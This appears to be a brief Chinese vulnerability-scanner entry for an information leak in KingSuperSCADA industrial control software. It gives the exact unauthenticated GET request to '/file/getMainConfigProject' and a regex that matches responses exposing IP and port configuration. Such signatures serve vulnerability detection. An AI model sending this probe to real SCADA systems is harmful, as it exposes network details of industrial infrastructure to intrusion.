# KingSuperSCADA信息泄露2

KingSuperSCADA ｜ 信息泄露 ｜ —
- **请求**：`GET /file/getMainConfigProject HTTP/1.1`
- **响应特征**：200 ^(?=.*?ip)(?=.*?port).*?$